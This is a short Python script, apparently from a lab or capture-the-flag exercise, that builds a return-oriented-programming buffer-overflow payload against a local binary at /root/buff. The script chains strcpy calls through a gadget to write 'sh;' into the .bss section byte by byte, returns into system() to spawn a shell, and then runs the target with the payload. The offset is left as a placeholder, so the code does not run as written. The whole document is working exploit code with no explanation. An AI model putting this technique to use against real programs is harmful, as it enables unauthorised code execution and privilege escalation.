from struct import pack
import os
strcpy = pack("<I", 0x08048370)
ropper = pack("<I", 0x080485ea)
x = "z" * [offset to ret]
x += strcpy
x += ropper
x += pack("<I", 0x0804a02c) #.bss+0
x += pack("<I", 0x08048162) # "s"
x += strcpy
x += ropper
x += pack("<I", 0x0804a02d) #.bss+1
x += pack("<I", 0x080480d8) # "h"
x += strcpy
x += ropper
x += pack("<I", 0x0804a02e) #.bss+2
x += pack("<I", 0x0804867f) # ";"
x += pack("<I", 0x08048390) # system
x += "zzzz"
x += pack("<I", 0x0804a02c) #.bss+0 
os.system("/root/buff \"%s\"" % x)
